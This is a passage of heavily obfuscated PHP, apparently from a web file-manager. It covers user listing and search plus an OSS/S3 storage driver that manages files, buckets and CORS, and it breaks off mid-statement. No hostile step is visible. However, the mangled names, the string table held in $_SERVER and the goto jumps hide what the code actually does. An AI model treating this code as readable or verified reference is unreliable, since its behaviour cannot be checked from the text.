$this->_makeOrder($Óóø±ı©)->field($ã©Ğ×‘ü[2354])->where($³„µìÉ‰)->join($ùºòÌí¨)->selectPage(50); $this->_listDataApply($œ…É¤[$ã©Ğ×‘ü[369]]); return $œ…É¤; } private function _makeOrder($¤ßÃ”ğµ = '') { $İï¹”—— =& $_SERVER[şÒÁøÒÄ]; $ìƒÎÎÉï = array($İï¹”——[1680], $İï¹”——[32], $İï¹”——[1858], $İï¹”——[1830], $İï¹”——[201]); $°ÄéÀÈˆ = array($İï¹”——[450] => $İï¹”——[451], $İï¹”——[452] => $İï¹”——[453]); $Ş£Å ù = Input::get($İï¹”——[457], $İï¹”——[7], $İï¹”——[1671], $ìƒÎÎÉï); $‹æ±ÔÜï = Input::get($İï¹”——[458], $İï¹”——[7], $İï¹”——[1960], array($İï¹”——[1960], $İï¹”——[452])); $‹æ±ÔÜï = $°ÄéÀÈˆ[$‹æ±ÔÜï]; $¤ßÃ”ğµ = $¤ßÃ”ğµ . "\165\x73\145\x72\56{$Ş£Å ù}\40{$‹æ±ÔÜï}\x2c\x20\165\163\x65\x72\x2e\165\163\x65\162\111\x44\x20\141\x73\x63"; return $this->alias($İï¹”——[2086])->order($¤ßÃ”ğµ); } public function listSearch($ó°ï›œ´) { $—´³›ãº =& $_SERVER[şÒÁøÒÄ]; $éìãşŠ = $ó°ï›œ´[$—´³›ãº[1963]]; $ĞÅ²áù = isset($ó°ï›œ´[$—´³›ãº[1964]]) ? $ó°ï›œ´[$—´³›ãº[1964]] : !1; $éìãşŠ = str_replace($—´³›ãº[1965], $—´³›ãº[1966], trim($éìãşŠ)); $¨Ó¿†÷… = array($—´³›ãº[32] => array($—´³›ãº[383], "\45{$éìãşŠ}\45"), $—´³›ãº[305] => array($—´³›ãº[383], "{$éìãşŠ}\x25"), $—´³›ãº[532] => array($—´³›ãº[383], "{$éìãşŠ}\x25"), $—´³›ãº[1013] => $—´³›ãº[1967]); if (Input::check($éìãşŠ, $—´³›ãº[311])) { $¨Ó¿†÷…[$—´³›ãº[1680]] = array($—´³›ãº[383], "{$éìãşŠ}\45"); $¨Ó¿†÷…[$—´³›ãº[2336]] = array($—´³›ãº[383], "{$éìãşŠ}\x25"); } if (!$éìãşŠ) { $¨Ó¿†÷… = array(); } if (isset($ó°ï›œ´[$—´³›ãº[757]])) { $¨Ó¿†÷…[$—´³›ãº[757]] = $ó°ï›œ´[$—´³›ãº[757]]; } $¨Ó¿†÷… = $this->parseWhereLike($¨Ó¿†÷…); $µşÙßÛ = $this->_makeOrder()->where($¨Ó¿†÷…)->selectPage(20); if (!$µşÙßÛ || count($µşÙßÛ[$—´³›ãº[369]]) < 5 && Input::check($éìãşŠ, $—´³›ãº[318])) { $…¯Ã = $this->_searchFromMeta($—´³›ãº[464], $éìãşŠ, 10); $ÀÖËúá£ = $this->_searchFromMeta($—´³›ãº[465], $éìãşŠ, 10); $¿ğ’ö÷˜ = array_merge($…¯Ã, $ÀÖËúá£, $µşÙßÛ[$—´³›ãº[369]]); $µşÙßÛ[$—´³›ãº[369]] = array_unique_by_key($¿ğ’ö÷˜, $—´³›ãº[1680]); $µşÙßÛ[$—´³›ãº[366]][$—´³›ãº[367]] = count($µşÙßÛ[$—´³›ãº[369]]); $µşÙßÛ[$—´³›ãº[366]][$—´³›ãº[368]] = ceil($µşÙßÛ[$—´³›ãº[366]][$—´³›ãº[367]] / $µşÙßÛ[$—´³›ãº[366]][$—´³›ãº[363]]); } $this->_listDataApply($µşÙßÛ[$—´³›ãº[369]]); $this->_filterByGroup($µşÙßÛ, $ĞÅ²áù); return $µşÙßÛ; } private function _filterByGroup(&$¡–ŸÄû±, $»Ş›Ğ»¥) { $Ã¤‚–ÚÑ =& $_SERVER[şÒÁøÒÄ]; if (!$»Ş›Ğ»¥) { return $¡–ŸÄû±; } foreach ($¡–ŸÄû±[$Ã¤‚–ÚÑ[369]] as $…–ĞĞ¨ => &$³ú˜Ó­æ) { $æ¨ëî£œ = array_to_keyvalue($³ú˜Ó­æ[$Ã¤‚–ÚÑ[2056]], $Ã¤‚–ÚÑ[12], $Ã¤‚–ÚÑ[1869]); if (!in_array($»Ş›Ğ»¥, $æ¨ëî£œ)) { unset($¡–ŸÄû±[$Ã¤‚–ÚÑ[369]][$…–ĞĞ¨]); } } unset($³ú˜Ó­æ); $¡–ŸÄû±[$Ã¤‚–ÚÑ[369]] = array_values($¡–ŸÄû±[$Ã¤‚–ÚÑ[369]]); $¡–ŸÄû±[$Ã¤‚–ÚÑ[366]] = array($Ã¤‚–ÚÑ[2120] => count($¡–ŸÄû±[$Ã¤‚–ÚÑ[369]]), $Ã¤‚–ÚÑ[2118] => $¡–ŸÄû±[$Ã¤‚–ÚÑ[366]][$Ã¤‚–ÚÑ[363]], $Ã¤‚–ÚÑ[2117] => 1, $Ã¤‚–ÚÑ[2119] => 1); } private function _searchFromMeta($•²ÑÁÄÃ, $ÚìŞŸÉô, $¿‘‹ ) { $Û—ºá—î =& $_SERVER[şÒÁøÒÄ]; $ÚìŞŸÉô = strtolower($ÚìŞŸÉô); $Ü¡î¿÷ª = array($Û—ºá—î[94] => $•²ÑÁÄÃ, $Û—ºá—î[374] => array($Û—ºá—î[383], "\45{$ÚìŞŸÉô}\x25")); $Ü¡î¿÷ª = $this->parseWhereLike($Ü¡î¿÷ª); $ŞıÃçı• = Model($Û—ºá—î[2355])->where($Ü¡î¿÷ª)->limit($¿‘‹ )->select(); if (!$ŞıÃçı•) { return array(); } $ŞıÃçı• = array_to_keyvalue($ŞıÃçı•, $Û—ºá—î[12], $Û—ºá—î[1680]); $×ÌÄİ¬Œ = $this->where(array($Û—ºá—î[1671] => array($Û—ºá—î[7], $ŞıÃçı•)))->select(); if (!$×ÌÄİ¬Œ) { return array(); } return $×ÌÄİ¬Œ; } private function _listDataApplyItem($Îš€Ø‡) { $Ã®•°üç = array($Îš€Ø‡); $this->_listDataApply($Ã®•°üç); return $Ã®•°üç[0]; } private function _listDataApply(&$°á¼Òó¢) { $È§Ôºá³ =& $_SERVER[şÒÁøÒÄ]; if (!$°á¼Òó¢) { return; } array_remove_key($°á¼Òó¢, $È§Ôºá³[902]); $ô‘ñ™Ô¹ = array_to_keyvalue($°á¼Òó¢, $È§Ôºá³[12], $È§Ôºá³[1680]); $this->_listAppendGroup($°á¼Òó¢, $ô‘ñ™Ô¹); $this->_listAppendMeta($°á¼Òó¢, $ô‘ñ™Ô¹); $this->_listAppendSourceRoot($°á¼Òó¢, $ô‘ñ™Ô¹); } private function _listAppendSourceRoot(&$ˆŸ¹é€â, $ê†İÅ“) { $¦ä¸ê¸Å =& $_SERVER[şÒÁøÒÄ]; $İ„–•‰Ò = Model($¦ä¸ê¸Å[833])->listSourceRoot(SourceModel::TYPE_USER, $ê†İÅ“); $İ„–•‰Ò = array_to_keyvalue($İ„–•‰Ò, $¦ä¸ê¸Å[496]); $İ„–•‰Ò = array_remove_key($İ„–•‰Ò, $¦ä¸ê¸Å[496]); foreach ($ˆŸ¹é€â as &$ÃÈ¹©ª) { $ÃÈ¹©ª[$¦ä¸ê¸Å[87]] = $İ„–•‰Ò[$ÃÈ¹©ª[$¦ä¸ê¸Å[1680]]] ? $İ„–•‰Ò[$ÃÈ¹©ª[$¦ä¸ê¸Å[1680]]] : array(); } unset($ÃÈ¹©ª); } private function _listAppendGroup(&$Åª±ï×¨, $óÙØõì) { $Ëğù§©¯ =& $_SERVER[şÒÁøÒÄ]; $ÂşÃ®­ = array($Ëğù§©¯[1680] => array($Ëğù§©¯[7], $óÙØõì)); $ŒæÆãğ‘ = Model($Ëğù§©¯[1959])->where($ÂşÃ®­)->select(); $öÃÚ½Õ• = array_to_keyvalue($ŒæÆãğ‘, $Ëğù§©¯[12], $Ëğù§©¯[1869]); $öÃÚ½Õ• = array_remove_value(array_unique($öÃÚ½Õ•), $Ëğù§©¯[198]); if (!$öÃÚ½Õ• || !$ŒæÆãğ‘) { return; } $ÂşÃ®­ = array($Ëğù§©¯[1869] => array($Ëğù§©¯[7], $öÃÚ½Õ•)); $Äı¤ßó‡ = Model($Ëğù§©¯[2054])->field($Ëğù§©¯[2356])->where($ÂşÃ®­)->select(); $Äı¤ßó‡ = array_to_keyvalue($Äı¤ßó‡, $Ëğù§©¯[1869]); $ŒæÆãğ‘ = array_to_keyvalue_group($ŒæÆãğ‘, $Ëğù§©¯[1680]); foreach ($ŒæÆãğ‘ as &$×çÜ›é®) { $µ–ãç§« = array(); foreach ($×çÜ›é® as $óËÂ¥®”) { if (!$óËÂ¥®”[$Ëğù§©¯[1973]]) { continue; } $†ú…‹ÅÒ = Model($Ëğù§©¯[498])->listData($óËÂ¥®”[$Ëğù§©¯[1973]]); $µ–ãç§«[] = array($Ëğù§©¯[1869] => $óËÂ¥®”[$Ëğù§©¯[1869]], $Ëğù§©¯[2357] => $Äı¤ßó‡[$óËÂ¥®”[$Ëğù§©¯[1869]]][$Ëğù§©¯[32]], $Ëğù§©¯[511] => $Äı¤ßó‡[$óËÂ¥®”[$Ëğù§©¯[1869]]][$Ëğù§©¯[511]], $Ëğù§©¯[413] => $†ú…‹ÅÒ); } $×çÜ›é® = $µ–ãç§«; } unset($×çÜ›é®); foreach ($Åª±ï×¨ as &$ãÈ–ßÀŸ) { $ãÈ–ßÀŸ[$Ëğù§©¯[2056]] = array(); if (isset($ŒæÆãğ‘[$ãÈ–ßÀŸ[$Ëğù§©¯[1680]]])) { $ãÈ–ßÀŸ[$Ëğù§©¯[2056]] = $ŒæÆãğ‘[$ãÈ–ßÀŸ[$Ëğù§©¯[1680]]]; } } unset($ãÈ–ßÀŸ); } public function userAppendGroup($ö¼ëÌäà) { $æÆ«“ö­ =& $_SERVER[şÒÁøÒÄ]; if (!$ö¼ëÌäà) { return array(); } $this->_listAppendGroup($ö¼ëÌäà, array_to_keyvalue($ö¼ëÌäà, $æÆ«“ö­[12], $æÆ«“ö­[1680])); return $ö¼ëÌäà; } private function _listAppendMeta(&$çÊù¡¡†, $ƒÜ¡ã¿») { $ˆÄõ‡ìŠ =& $_SERVER[şÒÁøÒÄ]; $Øğ©·˜… = UserJobModel::JOB_KEY; $œšœÍ–Š = array($ˆÄõ‡ìŠ[2337]); $éÊê»ùÉ = array($ˆÄõ‡ìŠ[1680] => array($ˆÄõ‡ìŠ[7], $ƒÜ¡ã¿»)); $ñë²´§Ï = Model($ˆÄõ‡ìŠ[2335])->where($éÊê»ùÉ)->select(); $ñë²´§Ï = array_to_keyvalue_group($ñë²´§Ï, $ˆÄõ‡ìŠ[1680]); foreach ($ñë²´§Ï as &$®µáĞÂ™) { $»Ù•Ş“ = array(); foreach ($®µáĞÂ™ as $Ô™˜òŸ‹) { if (!in_array($Ô™˜òŸ‹[$ˆÄõ‡ìŠ[94]], $œšœÍ–Š)) { $»Ù•Ş“[$Ô™˜òŸ‹[$ˆÄõ‡ìŠ[94]]] = $Ô™˜òŸ‹[$ˆÄõ‡ìŠ[374]]; } } $®µáĞÂ™ = $»Ù•Ş“; } unset($®µáĞÂ™); $öê‡ÃÉ® = Model($ˆÄõ‡ìŠ[2358]); foreach ($çÊù¡¡† as &$§¼îƒÃñ) { $ƒèŠ‹¡ = array(); if (isset($ñë²´§Ï[$§¼îƒÃñ[$ˆÄõ‡ìŠ[1680]]])) { $ƒèŠ‹¡ = $ñë²´§Ï[$§¼îƒÃñ[$ˆÄõ‡ìŠ[1680]]]; } $§¼îƒÃñ[$ˆÄõ‡ìŠ[2359]] = array(); if (isset($ƒèŠ‹¡[$Øğ©·˜…])) { $§¼îƒÃñ[$ˆÄõ‡ìŠ[2359]] = $öê‡ÃÉ®->getUserJobInfo($ƒèŠ‹¡[$Øğ©·˜…]); } } unset($§¼îƒÃñ); } protected function groupUserAll($Éôö§Ã) { $ô¹†«¦¥ =& $_SERVER[şÒÁøÒÄ]; if (!$Éôö§Ã) { return !1; } $€ä­¾Ù— = Model($ô¹†«¦¥[1959])->field($ô¹†«¦¥[1680])->where(array($ô¹†«¦¥[1869] => array($ô¹†«¦¥[7], $Éôö§Ã)))->select(); $€ä­¾Ù— = array_to_keyvalue($€ä­¾Ù—, $ô¹†«¦¥[12], $ô¹†«¦¥[1680]); return array_unique($€ä­¾Ù—); } public function userSearch($ßÖˆ€¤, $Ñ±£Ÿíø = "\52") { return Model($_SERVER[şÒÁøÒÄ][525])->where($ßÖˆ€¤)->field($Ñ±£Ÿíø)->find(); } } goto Bäá†·ñ¿; E–ˆ¥¡íÛ‚: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ï¶Š©”) { parent::__construct($ï¶Š©”); $this->signatureVersion($_SERVER[şÒÁøÒÄ][216]); } public function fileOutLink($¨ÈÌ£öÓ) { $‚ÕÖ›Í— =& $_SERVER[şÒÁøÒÄ]; if (substr($¨ÈÌ£öÓ, 0, 7) == $‚ÕÖ›Í—[1350]) { $¨ÈÌ£öÓ = $‚ÕÖ›Í—[1351] . substr($¨ÈÌ£öÓ, 7); } header($‚ÕÖ›Í—[161] . $¨ÈÌ£öÓ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($Â¼¶»ï¬) { parent::__construct(); include_once SDK_DIR . $_SERVER[şÒÁøÒÄ][1409]; $this->_init($Â¼¶»ï¬); } public function _init($ç¤ªÑ†÷) { $¼¿¾²‹ñ =& $_SERVER[şÒÁøÒÄ]; $this->config = $ç¤ªÑ†÷; foreach ($ç¤ªÑ†÷ as $îı¬°¶Š => $şµ‘—¥¢) { if (isset($this->{$îı¬°¶Š})) { $this->{$îı¬°¶Š} = $şµ‘—¥¢; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¼¿¾²‹ñ[1410] . LNG($¼¿¾²‹ñ[1411])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Ş¯¿ºÛÅ =& $_SERVER[şÒÁøÒÄ]; $£Îæşù• = new OSS\Model\CorsConfig(); $ÍæèÚ½” = new OSS\Model\CorsRule(); $ÍæèÚ½”->addAllowedOrigin($Ş¯¿ºÛÅ[1412]); $ÍæèÚ½”->addAllowedMethod($Ş¯¿ºÛÅ[1413]); $ÍæèÚ½”->addAllowedMethod($Ş¯¿ºÛÅ[1414]); $ÍæèÚ½”->addAllowedMethod($Ş¯¿ºÛÅ[1415]); $ÍæèÚ½”->addAllowedMethod($Ş¯¿ºÛÅ[1416]); $ÍæèÚ½”->addAllowedMethod($Ş¯¿ºÛÅ[160]); $ÍæèÚ½”->setMaxAgeSeconds(600); $ÍæèÚ½”->addExposeHeader($Ş¯¿ºÛÅ[1417]); $ÍæèÚ½”->addAllowedHeader($Ş¯¿ºÛÅ[1412]); $£Îæşù•->addRule($ÍæèÚ½”); try { $this->client->putBucketCors($this->bucket, $£Îæşù•); } catch (OSS\Core\OssException $†Ëˆ÷¥é) { return !1; } return !0; } public function getBucketCors() { $ûûßÓ³ =& $_SERVER[şÒÁøÒÄ]; $ÖßÒ³¤ = null; try { $ÖßÒ³¤ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ç¯Ô¯¿¥) { return null; } if (!$ÖßÒ³¤ || !($ƒ‹£ÏÄÑ = $ÖßÒ³¤->getRules())) { return null; } $·£ŠÚÍ = $ƒ‹£ÏÄÑ[0]->getAllowedOrigins(); $ ˆí¤ö´ = $ƒ‹£ÏÄÑ[0]->getAllowedMethods(); $–…İ¼œæ = $ƒ‹£ÏÄÑ[0]->getMaxAgeSeconds(); $öİô‡„© = $ƒ‹£ÏÄÑ[0]->getExposeHeaders(); $Íí‘Àìè = $ƒ‹£ÏÄÑ[0]->getAllowedHeaders(); return array($ûûßÓ³[188] => isset($·£ŠÚÍ[0]) ? $·£ŠÚÍ[0] : $ûûßÓ³[12], $ûûßÓ³[192] => $ ˆí¤ö´, $ûûßÓ³[1418] => $–…İ¼œæ, $ûûßÓ³[1419] => isset($öİô‡„©[0]) ? $öİô‡„©[0] : $ûûßÓ³[12], $ûûßÓ³[190] => isset($Íí‘Àìè[0]) ? $Íí‘Àìè[0] : $ûûßÓ³[12]); } public function isBucketCors() { $½—¢Âşº =& $_SERVER[şÒÁøÒÄ]; $ú¸›œ´Ÿ = $this->getBucketCors(); if (!$ú¸›œ´Ÿ || !is_array($ú¸›œ´Ÿ)) { return !1; } if ($ú¸›œ´Ÿ[$½—¢Âşº[188]] != $½—¢Âşº[189] || $ú¸›œ´Ÿ[$½—¢Âşº[190]] != $½—¢Âşº[189]) { return !1; } $…ÕÃ¦µ× = array_map($½—¢Âşº[191], $ú¸›œ´Ÿ[$½—¢Âşº[192]]); if (!is_array($…ÕÃ¦µ×)) { $…ÕÃ¦µ× = array(); } $ µ«Øİ¬ = array($½—¢Âşº[193], $½—¢Âşº[194], $½—¢Âşº[195], $½—¢Âşº[196], $½—¢Âşº[197]); $• ƒ÷–À = array_diff($ µ«Øİ¬, $…ÕÃ¦µ×); return empty($• ƒ÷–À); } public function mkfile($—ì•ü¥Ÿ, $›ÌÓ¿¸ = '', $öıØæ¹Ú = REPEAT_RENAME) { $öŞ Ì’— = $this->setContent($—ì•ü¥Ÿ, $›ÌÓ¿¸); if ($öŞ Ì’— !== !1) { return $this->getPathOuter($—ì•ü¥Ÿ); } return !1; } public function mkdir($†Íà·¶, $Ôñˆ¦è = REPEAT_SKIP) { if ($Ôñˆ¦è && $this->_isFolder($†Íà·¶)) { return $this->getPathOuter($†Íà·¶); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($†Íà·¶)); } catch (OSS\Core\OssException $Šã½Ô¾) { return !1; } return $this->getPathOuter($†Íà·¶); } private function fileList($›‚Şùı, $ŸĞì¦»Ù = '', $Ï¼…ı—² = 0) { $ü¡¤¨œè =& $_SERVER[şÒÁøÒÄ]; $›‚Şùı = trim($›‚Şùı, $ü¡¤¨œè[8]); $“·ÀÌ½ = empty($›‚Şùı) && $›‚Şùı !== $ü¡¤¨œè[198] ? $ü¡¤¨œè[12] : $›‚Şùı . $ü¡¤¨œè[8]; $É²Áå‘ = $ü¡¤¨œè[12]; $‘£î¶°ì = 1000; $Ü»ˆ™¹â = $Àï¯éö® = array(); while (!0) { check_abort(); $ü»ŠŞõô = array($ü¡¤¨œè[1420] => $ŸĞì¦»Ù, $ü¡¤¨œè[1421] => $“·ÀÌ½, $ü¡¤¨œè[1422] => $‘£î¶°ì, $ü¡¤¨œè[1423] => $É²Áå‘); try { $ø—º°‡Ï = $this->client->listObjects($this->bucket, $ü»ŠŞõô); } catch (OSS\Core\OssException $ĞÍÛ”²) { break; } $É²Áå‘ = $ø—º°‡Ï->getNextMarker(); $€—Ôšáø = $ø—º°‡Ï->getObjectList(); $‘ëûÄª = $ø—º°‡Ï->getPrefixList(); foreach ($€—Ôšáø as $ÄÉÄ—¶Ğ) { if ($ÄÉÄ—¶Ğ->getKey() == $“·ÀÌ½) { continue; } $ñ¤±…¶ş = $ÄÉÄ—¶Ğ->getKey(); $ìì¤Ä• = $ÄÉÄ—¶Ğ->getSize(); $æèĞ™‰ä = $ÄÉÄ—¶Ğ->getLastModified(); $ë”üÊŞĞ = $Ï¼…ı—² ? array($ü¡¤¨œè[32] => $ñ¤±…¶ş, $ü¡¤¨œè[76] => $ìì¤Ä•, $ü¡¤¨œè[180] => strtotime($æèĞ™‰ä)) : $ñ¤±…¶ş; $Ö¸Éñçã = $ìì¤Ä• == 0 && substr($ñ¤±…¶ş, strlen($ñ¤±…¶ş) - 1, 1) == $ü¡¤¨œè[8] ? !0 : !1; $è¦ıŞæ = array($ü¡¤¨œè[76] => $ìì¤Ä•, $ü¡¤¨œè[1424] => $ìì¤Ä•, $ü¡¤¨œè[85] => strtotime($æèĞ™‰ä), $ü¡¤¨œè[1425] => $æèĞ™‰ä); $this->cacheMethodInfoSet($ñ¤±…¶ş, $Ö¸Éñçã, $è¦ıŞæ); if ($Ö¸Éñçã) { $Ü»ˆ™¹â[] = $ñ¤±…¶ş; continue; } $Àï¯éö®[] = $ë”üÊŞĞ; } foreach ($‘ëûÄª as $…¬Åò’ü) { $Ü»ˆ™¹â[] = $…¬Åò’ü->getPrefix(); $this->cacheMethodInfoSet($…¬Åò’ü->getPrefix(), !0); } if ($É²Áå‘ === $ü¡¤¨œè[12]) { break; } } $this->cacheMethodInfoSet($›‚Şùı, !0); return array($ü¡¤¨œè[82] => $Ü»ˆ™¹â, $ü¡¤¨œè[83] => $Àï¯éö®); } public function copyFile($õ°şØŒ¾, $Ã¹æ¬“ú) { $—Ñäü¨ = $this->size($õ°şØŒ¾); if ($—Ñäü¨ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $õ°şØŒ¾, $this->bucket, $this->pathEncode($Ã¹æ¬“ú)); } catch (OSS\Core\OssException $—êá“) { return !1; } return $this->getPathOuter($Ã¹æ¬“ú); } $¿œ˜Òå = $this->multiCopyObject($õ°şØŒ¾, $Ã¹æ¬“ú, $—Ñäü¨); return $¿œ˜Òå ? $this->getPathOuter($Ã¹æ¬“ú) : !1; } private function multiCopyObject($øßàäÏÆ, $ÍşµĞÖ, $ÚÀƒ‚¢Í) { $üÂ§ìÎ· =& $_SERVER[şÒÁøÒÄ]; try { $ãĞ¾¡‚ = array(); if ($É–õƒ­ = $this->hashMd5($øßàäÏÆ)) { $ãĞ¾¡‚ = array(OSS\OssClient::OSS_HEADERS => array($üÂ§ìÎ·[1426] => $É–õƒ­)); } $ì³ğ¬·å = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÍşµĞÖ), $ãĞ¾¡‚); $±³ü’ß = 1; $õ¢Âöíø = 0; $Ó•”îë™ = array(); $ß “™¼  = 1024 * 1024 * 10; $æ£Ï¢û˜ = $this->client->generateMultiuploadParts($ÚÀƒ‚¢Í, $ß “™¼ ); foreach ($æ£Ï¢û˜ as $¸úï§ï => $×—Š´ªç) { $å¸­üôä = $õ¢Âöíø + (int) $×—Š´ªç[$üÂ§ìÎ·[1427]]; $ğ÷Ğ€¬Î = (int) $×—Š´ªç[$üÂ§ìÎ·[337]] + $å¸­üôä - 1; $£ÑÌùšÊ = array($üÂ§ìÎ·[1428] => $å¸­üôä, $üÂ§ìÎ·[1429] => $ğ÷Ğ€¬Î); $Ó•”îë™[] = $this->client->uploadPartCopy($this->bucket, $øßàäÏÆ, $this->bucket, $this->pathEncode($ÍşµĞÖ), $±³ü’ß, $ì³ğ¬·å, $£ÑÌùšÊ); $±³ü’ß = $±³ü’ß + 1; } $¬ÉÃÖóõ = array(); foreach ($Ó•”îë™ as $¸úï§ï => $Ìù¬ŞµŒ) { $¬ÉÃÖóõ[] = array($üÂ§ìÎ·[1430] => $¸úï§ï + 1, $üÂ§ìÎ·[1431] => $Ìù¬ŞµŒ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ÍşµĞÖ), $ì³ğ¬·å, $¬ÉÃÖóõ); } catch (OSS\Core\OssException $µ¡°ìÕ) { return !1; } return !0; } public function moveFile($¾Ë§ìí», $°Ãô¨Î˜) { if ($this->copyFile($¾Ë§ìí», $°Ãô¨Î˜)) { $this->remove($¾Ë§ìí»); return $this->getPathOuter($°Ãô¨Î˜); } return !1; } public function delFile($ãºø¬ØÀ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ãºø¬ØÀ)); } catch (OSS\Core\OssException $†´ƒé±¤) { return !1; } return !0; } public function delFolder($Œ­İü¡Ô) { $è¸§Áó =& $_SERVER[şÒÁøÒÄ]; if (!$this->exist($Œ­İü¡Ô)) { return !0; } $this->listItemCache = !1; $æÕìõ›² = $this->fileList($Œ­İü¡Ô); $this->listItemCache = !0; $Ğ‘Ù‹ù¢ = trim($Œ­İü¡Ô, $è¸§Áó[8]) . $è¸§Áó[8]; if (!empty($Œ­İü¡Ô) && $Œ­İü¡Ô !== $è¸§Áó[198] && !in_array($Ğ‘Ù‹ù¢, $æÕìõ›²[$è¸§Áó[82]])) { $æÕìõ›²[$è¸§Áó[82]][] = $Ğ‘Ù‹ù¢; } $‚İá¯Ş‹ = $this->delByBatch($æÕìõ›²[$è¸§Áó[83]]); if (!$‚İá¯Ş‹) { return !1; } $‚İá¯Ş‹ = $this->delByBatch($æÕìõ›²[$è¸§Áó[82]]); if (!$‚İá¯Ş‹) { return !1; } return $this->delFile($Ğ‘Ù‹ù¢); } private function delByBatch($ç÷Íİ°¯) { foreach (array_chunk($ç÷Íİ°¯, 1000) as $ŞÎğ»©§) { try { $this->client->deleteObjects($this->bucket, $ŞÎğ»©§); } catch (OSS\Core\OssException $¶Ì©·Íµ) { return !1; } } return !0; } public function rename($÷®àÊ‰–, $èéèã¡Æ) { return $this->renameObject($÷®àÊ‰–, $èéèã¡Æ); } private function fileInfo($¶´¦™íÛ, $¥§ş®è± = false, $ê¬å¾šÓ = array()) { $µ–å›© =& $_SERVER[şÒÁøÒÄ]; $€ÎÓà¦ = array($µ–å›©[32] => $this->pathThis($¶´¦™íÛ), $µ–å›©[84] => $this->getPathOuter($¶´¦™íÛ), $µ–å›©[33] => $µ–å›©[200], $µ–å›©[76] => isset($ê¬å¾šÓ[$µ–å›©[76]]) ? $ê¬å¾šÓ[$µ–å›©[76]] : 0, $µ–å›©[174] => $this->ext($¶´¦™íÛ)); if ($¥§ş®è±) { return $€ÎÓà¦; } $€ÎÓà¦[$µ–å›©[201]] = $€ÎÓà¦[$µ–å›©[85]] = 0; $€ÎÓà¦[$µ–å›©[202]] = $€ÎÓà¦[$µ–å›©[203]] = !0; if (empty($ê¬å¾šÓ)) { $‡÷Ä†­û = $this->objectMeta($¶´¦™íÛ); if (!$‡÷Ä†­û) { return $€ÎÓà¦; } $ê¬å¾šÓ = array($µ–å›©[85] => strtotime($‡÷Ä†­û[$µ–å›©[1425]]), $µ–å›©[76] => $‡÷Ä†­û[$µ–å›©[1424]] + 0); } if (isset($ê¬å¾šÓ[$µ–å›©[76]])) { $€ÎÓà¦[$µ–å›©[76]] = $ê¬å¾šÓ[$µ–å›©[76]]; } if (isset($ê¬å¾šÓ[$µ–å›©[85]])) { $€ÎÓà¦[$µ–å›©[85]] = $ê¬å¾šÓ[$µ–å›©[85]]; } if (isset($ê¬å¾šÓ[$µ–å›©[180]]) && !trim($€ÎÓà¦[$µ–å›©[85]])) { $€ÎÓà¦[$µ–å›©[85]] = $ê¬å¾šÓ[$µ–å›©[180]]; } return $€ÎÓà¦; } private function folderInfo($÷Øš‹Ÿî, $½²“úéÊ = false, $ìıÍÖª¸ = array()) { $Ø¼ÄöÅ =& $_SERVER[şÒÁøÒÄ]; $ã†÷Ç´å = array($Ø¼ÄöÅ[32] => $this->pathThis($÷Øš‹Ÿî), $Ø¼ÄöÅ[84] => $this->getPathOuter($Ø¼ÄöÅ[8] . $÷Øš‹Ÿî), $Ø¼ÄöÅ[33] => $Ø¼ÄöÅ[75]); if ($½²“úéÊ) { return $ã†÷Ç´å; } $ã†÷Ç´å[$Ø¼ÄöÅ[201]] = $ã†÷Ç´å[$Ø¼ÄöÅ[85]] = 0; $ã†÷Ç´å[$Ø¼ÄöÅ[202]] = $ã†÷Ç´å[$Ø¼ÄöÅ[203]] = !0; if (empty($ìıÍÖª¸)) { $÷Øš‹Ÿî = rtrim($÷Øš‹Ÿî, $Ø¼ÄöÅ[8]) . $Ø¼ÄöÅ[8]; $¹µ®‡— = $this->objectMeta($÷Øš‹Ÿî); if (!$¹µ®‡—) { return $ã†÷Ç´å; } $ìıÍÖª¸ = array($Ø¼ÄöÅ[201] => $¹µ®‡—[$Ø¼ÄöÅ[502]][$Ø¼ÄöÅ[1432]], $Ø¼ÄöÅ[85] => strtotime($¹µ®‡—[$Ø¼ÄöÅ[1425]])); } if (isset($ìıÍÖª¸[$Ø¼ÄöÅ[85]])) { $ã†÷Ç´å[$Ø¼ÄöÅ[85]] = $ìıÍÖª¸[$Ø¼ÄöÅ[85]]; } if (isset($ìıÍÖª¸[$Ø¼ÄöÅ[201]])) { $ã†÷Ç´å[$Ø¼ÄöÅ[201]] = $ìıÍÖª¸[$Ø¼ÄöÅ[201]]; } return $ã†÷Ç´å; } public function listPath($¬Æ¢˜ø, $Şİ¢á«Ù = false) { $Ğ‘ıéÎÙ =& $_SERVER[şÒÁøÒÄ]; $…¾˜¦± = $this->fileList($¬Æ¢˜ø, $Ğ‘ıéÎÙ[8], !0); foreach ($…¾˜¦±[$Ğ‘ıéÎÙ[82]] as $ôŠ¡¿ñô => $÷ÈÃŠ¡Ö) { $…¾˜¦±[$Ğ‘ıéÎÙ[82]][$ôŠ¡¿ñô] = $this->folderInfo($÷ÈÃŠ¡Ö, $Şİ¢á«Ù, $÷ÈÃŠ¡Ö); } foreach ($…¾˜¦±[$Ğ‘ıéÎÙ[83]] as $ôŠ¡¿ñô => $÷ÈÃŠ¡Ö) { $…¾˜¦±[$Ğ‘ıéÎÙ[83]][$ôŠ¡¿ñô] = $this->fileInfo($÷ÈÃŠ¡Ö[$Ğ‘ıéÎÙ[32]], $Şİ¢á«Ù, $÷ÈÃŠ¡Ö); } return $…¾˜¦±; } protected function infoChildren($ÅŸÅ¹åì, &$¬˜¯˜§Å) { $†Š£·¾‘ =& $_SERVER[şÒÁøÒÄ]; $»Ä¶¾„¿ = $this->fileList($ÅŸÅ¹åì, $†Š£·¾‘[12], !0); $¬˜¯˜§Å[$†Š£·¾‘[78]] += count($»Ä¶¾„¿[$†Š£·¾‘[82]]); $¬˜¯˜§Å[$†Š£·¾‘[77]] += count($»Ä¶¾„¿[$†Š£·¾‘[83]]); foreach 